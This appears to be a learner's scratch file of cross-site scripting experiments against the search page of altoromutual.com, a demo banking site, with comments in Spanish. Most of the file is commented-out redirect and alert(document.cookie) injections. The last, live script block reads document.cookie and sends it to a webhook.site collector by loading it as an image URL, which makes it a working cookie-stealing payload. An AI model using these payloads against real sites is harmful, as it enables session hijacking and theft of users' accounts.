// https://www.altoromutual.com/search.jsp?query=%3Cscript%3Ewindow.location.replace(%22http://www.altoromutual.com%22)%3C/script%3E

// <script>
//     window.location.replace("http://www.altoromutual.com/search.jsp?query=%3Ch1%3Ehola%3C/h1%3E");

// </script>

// // Con ese redirigimos y despues

// <script>
//     window.location.replace("http://www.altoromutual.com/search.jsp?query= <script>
//         window.onload = function() {
//             console.log("hola mundo");
//             console.log("hola mundo");
//             console.log("hola mundo");
//         };
//     </script>%3Ch1%3Ehola%3C/h1%3E");
// </script>

// <script>
//     http://www.altoromutual.com/search.jsp?query=<>window.location.replace("http://www.altoromutual.com/search.jsp?query=<h1>hola</h1>");
// </script>

// <script>
//     window.location.replace("http://www.altoromutual.com/search.jsp?query=%3Ch1%3Ehola%3C/h1%3E");
//     console.log("hola mundo");
//     console.log("hola mundo");
//     console.log("hola mundo");

// </script>

// <script>
//     alert(document.cookie);
// </script>

// <script>
// <img src="https://webhook.site/33a132a1-46aa-4df7-8fad-65402bcd4dc2?" onerror="alert(document.cookie);">
// </script>

// {
//   /* <script>
// document.write('<img src="https://webhook.site/cb6f2745-ca58-42b0-861e-0eb9e27a6908?'+document.cookie'" />');
// </script> */
// }

<script>
  let micookie = document.cookie; 
  let sitioWeb = "https://webhook.site/cb6f2745-ca58-42b0-861e-0eb9e27a6908?cookie=";
  let miURL = ''.concat(sitioWeb,micookie); 
  console.log(miURL);
  console.log(micookie);
  var img = document.createElement('img');
  img.src ='https://cdn.memegenerator.es/imagenes/memes/full/21/25/21254507.jpg';
  img.src = miURL;
  document.body.append(img);
  document.body.appendChild(img);
</script>;


